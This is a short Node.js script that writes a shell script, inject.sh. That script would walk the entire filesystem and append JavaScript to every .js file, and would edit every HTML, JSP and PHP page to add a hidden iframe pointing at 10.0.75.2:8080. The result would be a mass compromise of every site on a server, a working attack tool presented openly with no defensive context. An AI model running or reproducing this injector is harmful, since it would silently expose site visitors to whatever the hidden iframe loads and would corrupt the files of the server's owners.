const fs = require('fs');

const iframeSrc = '10.0.75.2:8080';

// command to inject iframe through JS
// has to be encoded http://stackoverflow.com/questions/1250079/how-to-escape-single-quotes-within-single-quoted-strings
// http://www.freeformatter.com/xml-escape.html
const scriptToInject = `;document.addEventListener("DOMContentLoaded", function(event) { document.body.insertAdjacentHTML( "beforeend", "<iframe style='display:none' src='${iframeSrc}'></iframe>" );});`.replace(/"/g, '\\"').replace(/'/g, `'"'"'`);

// finds all .JSs and inject the above script
const injectScript = `find / -type f -name "*.js" -exec sh -c 'echo "${scriptToInject}" >> "$1"' -- {} \\;`;

// finds all webpages and inject custom HTML
const injectHTML = `find / -type f -iregex '.*\\.\\(html\\|htm\\|jsp\\|php\\)$' -exec sed -i 's/<\\/body>/<iframe style="display:none" src="${iframeSrc}"><\\/iframe><\\/body>/g' {} +`;

fs.writeFileSync('inject.sh', `${injectScript} ; ${injectHTML}`);
process.exit(0);